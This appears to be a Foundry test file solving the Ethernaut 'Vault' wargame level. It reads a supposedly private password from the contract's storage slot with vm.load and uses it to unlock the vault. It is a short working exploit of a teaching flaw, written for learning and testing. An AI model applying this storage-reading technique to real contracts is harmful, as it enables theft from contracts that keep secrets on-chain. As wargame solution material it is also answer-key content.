// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/08_Vault.sol";

contract VaultTest is Test {
    Vault instance;
    address player1;

    function setUp() public {
        bytes32 password = "password";
        player1 = vm.addr(1);
        instance = new Vault(password);
    }

    function testattacker() public {
        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        instance.unlock(password);

        assertEq(instance.locked(), false);
    }
}
